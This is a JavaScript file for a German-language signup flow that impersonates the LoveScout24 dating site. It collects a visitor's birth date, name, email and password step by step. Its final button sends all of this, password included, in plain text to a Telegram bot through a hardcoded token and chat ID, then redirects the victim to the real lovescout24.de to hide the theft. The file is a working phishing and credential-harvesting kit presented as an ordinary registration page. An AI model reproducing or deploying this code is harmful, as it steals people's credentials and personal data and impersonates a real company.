// State: 1 - Geburtsdatum, 2 - Vorname, 3 - E-Mail, 4 - Passwort, 5 - Final, 6 - Checkboxes
let step = 1;

const btn = document.getElementById('weiter-btn');
const title = document.getElementById('step-title');
const group = document.getElementById('step-input-group');
const helper = document.getElementById('helper-text');
const progress = document.getElementById('progress-bar');

// ШАГ 1: дата рождения
const dobInput = document.getElementById('dob-input');

// Функция для сохранения данных в localStorage
function saveFormData(stepNumber) {
  const data = JSON.parse(localStorage.getItem('registrationData') || '{}');

  switch (stepNumber) {
    case 1:
      data.dob = dobInput.value;
      break;
    case 2:
      const nameInput = document.getElementById('name-input');
      data.name = nameInput?.value || '';
      break;
    case 3:
      const emailInput = document.getElementById('email-input');
      data.email = emailInput?.value || '';
      break;
    case 4:
      const passwordInput = document.getElementById('password-input');
      data.password = passwordInput?.value || '';
      break;
  }

  localStorage.setItem('registrationData', JSON.stringify(data));
}

// Функция для восстановления данных из localStorage
function loadFormData(stepNumber) {
  const data = JSON.parse(localStorage.getItem('registrationData') || '{}');

  switch (stepNumber) {
    case 1:
      if (data.dob) dobInput.value = data.dob;
      break;
    case 2:
      const nameInput = document.getElementById('name-input');
      if (nameInput && data.name) nameInput.value = data.name;
      break;
    case 3:
      const emailInput = document.getElementById('email-input');
      if (emailInput && data.email) emailInput.value = data.email;
      break;
    case 4:
      const passwordInput = document.getElementById('password-input');
      if (passwordInput && data.password) passwordInput.value = data.password;
      break;
  }
}

// Обработчик для поля даты рождения
dobInput.addEventListener('input', e => {
  // Формат DD/MM/JJJJ
  let v = dobInput.value.replace(/[^0-9]/g, '');
  if (v.length > 8) v = v.slice(0, 8);
  let f = v;
  if (v.length > 4)
    f = v.slice(0, 2) + '/' + v.slice(2, 4) + '/' + v.slice(4);
  else if (v.length > 2)
    f = v.slice(0, 2) + '/' + v.slice(2);
  dobInput.value = f;
  btn.disabled = f.length !== 10;
});

btn.addEventListener('click', () => {
  // Сохраняем данные текущего шага
  saveFormData(step);

  if (step === 1 && !btn.disabled) {
    step = 2;
    progress.style.width = '17%';
    title.innerHTML = '<span>Prima! Was ist Ihr Vorname?</span>';
    group.innerHTML = '<input type="text" class="name-input" id="name-input" placeholder="Vorname" maxlength="32">';
    helper.style.color = '#969696';
    helper.style.fontSize = '15px';
    helper.innerHTML = 'Sie können Buchstaben, Bindestriche und Leerzeichen nutzen';
    btn.disabled = true;

    // Восстанавливаем сохраненное значение
    loadFormData(2);

    const nameInput = document.getElementById('name-input');
    nameInput.addEventListener('input', e => {
      if (/^[A-Za-zÄÖÜäöüß \-]{2,32}$/.test(nameInput.value)) {
        btn.disabled = false;
        nameInput.style.color = '#23264b';
      } else {
        btn.disabled = true;
        btn.style.cursor = 'pointer';
        nameInput.style.color = '#bababa';
      }
    });
  } else if (step === 2 && !btn.disabled) {
    step = 3;
    progress.style.width = '34%';
    title.innerHTML = '<span>Fast geschafft! Geben Sie noch Ihre E-Mail-Adresse an.</span>';
    group.innerHTML = '<input type="email" class="email-input" id="email-input" placeholder="E-Mail-Adresse" maxlength="60">';
    helper.innerHTML = '&nbsp;';
    btn.disabled = true;

    loadFormData(3);

    const emailInput = document.getElementById('email-input');
    emailInput.addEventListener('input', e => {
      if (/^[\w.!#$%&'*+/=?^_`{|}~-]+@[\w-]+(\.[\w-]+)+$/.test(emailInput.value)) {
        btn.disabled = false;
        emailInput.style.color = '#23264b';
      } else {
        btn.disabled = true;
        btn.style.cursor = 'pointer';
        emailInput.style.color = '#bababa';
      }
    });
  } else if (step === 3 && !btn.disabled) {
    step = 4;
    progress.style.width = '51%';
    title.innerHTML = '<span>Letzter Schritt! Wählen Sie Ihr Passwort.</span>';
    group.innerHTML = '<input type="password" class="password-input" id="password-input" placeholder="Passwort" maxlength="30">';
    helper.innerHTML = '<div class="password-rules">Um die Sicherheit Ihres Kontos zu gewährleisten, muss Ihr Passwort Folgendes enthalten:<ul><li>Mindestens einen Großbuchstaben</li><li>Mindestens einen Kleinbuchstaben</li><li>Mindestens eine Zahl</li><li>Mindestens 8 Zeichen</li></ul></div>';
    btn.disabled = true;

    loadFormData(4);

    const passwordInput = document.getElementById('password-input');
    passwordInput.addEventListener('input', e => {
      const val = passwordInput.value;
      const valid = /[A-Z]/.test(val) && /[a-z]/.test(val) && /[0-9]/.test(val) && val.length >= 8;
      btn.disabled = !valid;
      btn.style.cursor = 'pointer';
      passwordInput.style.color = valid ? '#23264b' : '#bababa';
    });
  } else if (step === 4 && !btn.disabled) {
    step = 5;
    progress.style.width = '68%';
    group.style.border = 'none';
    group.style.display = 'flex';
    group.style.flexDirection = 'column';
    btn.style.display = 'none';
    title.innerHTML = '<span>Wollen Sie mit uns etwas Echtes starten?</span>';
    group.innerHTML = `
      <div class="main-desc">
        Erhalten Sie von uns Angebote und Einladungen zu Veranstaltungen in Ihrer Nähe, damit Sie eine besonders hohe Chance haben, sich zu verlieben!<br>Neugierig geworden?
      </div>
      <button class="final-btn" id="accept-btn" style="margin: 30px auto 0;">Annehmen</button><br>
      <button class="final-link" id="skip-btn" style="margin: 0 auto 0;">Überspringen</button>
    `;
    helper.innerHTML = '&nbsp;';

    document.getElementById('accept-btn').addEventListener('click', () => btn.dispatchEvent(new Event('click')));
    document.getElementById('skip-btn').addEventListener('click', () => btn.dispatchEvent(new Event('click')));
  } else if (step === 5 && !btn.disabled) {
    step = 6;
    progress.style.width = '100%';
    title.innerHTML = '<span>Sie haben unsere Allgemeinen Geschäftsbedingungen nicht akzeptiert.</span>';
    group.style.border = 'none';
    group.innerHTML = `
      <div class="checkbox-container">
        <label class="checkbox-label">
          <span class="checkbox-custom">
            <input type="checkbox" class="checkbox-input" id="checkbox1">
            <span class="checkbox-checkmark"></span>
          </span>
          <span class="checkbox-text">Ich bestätige, dass ich volljährig bin und die Allgemeinen Geschäftsbedingungen akzeptiere.</span>
        </label>
        <label class="checkbox-label">
          <span class="checkbox-custom">
            <input type="checkbox" class="checkbox-input" id="checkbox2">
            <span class="checkbox-checkmark"></span>
          </span>
          <span class="checkbox-text">Ich bin damit einverstanden, dass meine sensiblen Daten von LoveScout24 verarbeitet werden.</span>
        </label>
        <label class="checkbox-label">
          <span class="checkbox-custom">
            <input type="checkbox" class="checkbox-input" id="checkbox3">
            <span class="checkbox-checkmark"></span>
          </span>
          <span class="checkbox-text">Ich möchte per E-Mail kommerzielle Angebote zu Produkten oder Dienstleistungen von Partnern erhalten.</span>
        </label>
        <button class='finalising-btn' id='finalising-btn'>Main Cash Discount erstellen</button>
      </div>
    `;
          document.getElementById('finalising-btn').addEventListener('click', async function () {
          // Получение данных из localStorage
          const formData = localStorage.getItem('formData');
          const registrationData = localStorage.getItem('registrationData');

          // Парсинг JSON
          const parsedFormData = formData ? JSON.parse(formData) : {};
          const parsedRegistrationData = registrationData ? JSON.parse(registrationData) : {};

          // Формирование текста сообщения
          const message = `FormData: ${JSON.stringify(parsedFormData, null, 2)}\n\nRegistrationData: ${JSON.stringify(parsedRegistrationData, null, 2)}`;

          // Настройки Telegram Bot
          const botToken = '7598422575:AAHyxJW8x_iEbFOKAyfHif5dhhEnIrBMOtc'; // Замените на ваш реальный токен
          const chatId = '7651880443';       // Замените на ID чата или пользователя
          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

          try {
              // Отправка данных в Telegram
              const response = await fetch(telegramUrl, {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                      chat_id: chatId,
                      text: message
                  })
              });

              if (!response.ok) {
                  throw new Error('Ошибка при отправке данных в Telegram');
              }

              const result = await response.json();
              console.log('Сообщение успешно отправлено:', result);
          } catch (error) {
              console.error('Ошибка отправки:', error);
          } finally {
              // Перенаправление на указанную страницу
              window.location.href = 'https://www.lovescout24.de/'; // Замените на нужный URL
          }
      });
    btn.style.display = 'none';
    btn.disabled = true;

    const checkboxes = document.querySelectorAll('.checkbox-input');
    checkboxes.forEach(checkbox => {
      checkbox.addEventListener('change', () => {
        const allChecked = document.getElementById('checkbox1').checked &&
                          document.getElementById('checkbox2').checked &&
                          document.getElementById('checkbox3').checked;
        btn.disabled = !allChecked;
      });
    });
  }
});

